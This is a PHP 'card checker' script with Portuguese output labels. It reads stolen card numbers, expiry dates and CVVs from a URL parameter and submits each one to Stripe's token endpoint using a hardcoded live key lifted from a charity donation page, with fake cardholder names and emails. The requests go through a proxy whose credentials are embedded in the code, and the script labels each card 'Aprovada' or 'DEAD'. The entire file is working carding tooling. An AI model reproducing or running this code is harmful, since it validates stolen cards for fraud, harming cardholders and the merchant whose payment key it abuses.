<?php
    
    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", "»"), $lista)[0];
    $mes = multiexplode(array(":", "|", "»"), $lista)[1];
    $ano = multiexplode(array(":", "|", "»"), $lista)[2];
    $cvv = multiexplode(array(":", "|", "»"), $lista)[3];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
    function dadosnome(){
        $nome = file("lista_nomes.txt");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = file("lista_sobrenomes.txt");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }
    function email($nome){
        $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
        return $email;
    }                                 
    $nome = dadosnome();
    $sobrenome = dadossobre();
    $email = email($nome);
    $keys = array(
    1 => 'pk_live_iaU7twkNEfNkIkL3nYlUc0A9'
    ); 
    $key = array_rand($keys);
    $keyStripe = $keys[$key];
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
       curl_setopt($ch, CURLOPT_PROXY, "http://proxy-server.scraperapi.com:8001");
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "auto:8c544e1a29b557ca1cf9206f17356a44");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                               'Host: api.stripe.com',
                                               'content-type: application/x-www-form-urlencoded',
                                               'origin: https://checkout.stripe.com',
                                               'referer: https://checkout.stripe.com/m/v3/index-3f0dc197837628f45156bf4f7ed0f6ad.html?distinct_id=70eb7c54-14d8-98e6-8655-524c01e6404a',
                                               'user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
                                               ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F303cf2d)&referrer=https%3A%2F%2Fmarydickinson.org%2Fdonate%2F&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$nome.'+'.$sobrenome.'&card[address_line1]=102+Talvesz&card[address_city]=Boston&card[address_state]=27&card[address_zip]=02010&card[address_country]=Brazil&time_on_page=82453&guid=f6cbdeb4-7331-4368-83bb-278579816361&muid=65786105-c790-43f0-9f40-d674347b1002&sid=988d5656-fc95-4779-9399-4197818af15d&key='.$keyStripe);
    $resultado = curl_exec($ch);
if(strpos($resultado, 'processing_error')) {
$retorno = getStr2($resultado, 'message": "', '",');
$live = '<span class="badge badge-success">Aprovada</span>ㅤ>ㅤ'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'ㅤ>ㅤRETORNO:ㅤAPROVADA$$ㅤ>ㅤGATE:ㅤ'.$key."ㅤ>ㅤParwar<br>";
echo $live;
}elseif(strpos($resultado, 'security code is incorrect')){
 $retorno = getStr2($resultado, 'message": "', '",');
 $live = '<span class="badge badge-success">Aprovada</span>ㅤ>ㅤ'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'ㅤ>ㅤRETORNO:ㅤCVV INCORRETOㅤ>ㅤGATE:ㅤ'.$key."ㅤ>ㅤParwar<br>";
echo "$live<br>";
}elseif(strpos($resultado, 'message')){
$retorno = getStr2($resultado, 'message": "', '",');
echo '<span class="badge badge-danger">DEAD</span>ㅤ>ㅤ'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'ㅤ>ㅤRETORNO:ㅤ'.$retorno.'ㅤ>ㅤGATE:ㅤ'.$key."ㅤ>ㅤParwar<br>";

}elseif(strpos($resultado, 'Your card has expired.')){
 $retorno = getStr2($resultado, 'message": "', '",');
echo '<span class="badge badge-danger">Dead</span>ㅤ>ㅤ'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'ㅤ>ㅤRETORNO:ㅤCARTAO EXPIRADOㅤ>ㅤGATE:ㅤ'.$key."ㅤ>ㅤParwar<br>"; 

}elseif(strpos($resultado, 'token')){
echo '<span class="badge badge-danger">GATE SOBRECARREGADA</span>ㅤ>ㅤ'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'ㅤ>ㅤGATE:ㅤ'.$key." >ㅤParwar<br>";

}else {
 echo '<span class="badge badge-danger">Dead PROXY</span>ㅤ>ㅤ'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv."ㅤ>ㅤParwar<br>";
}
?>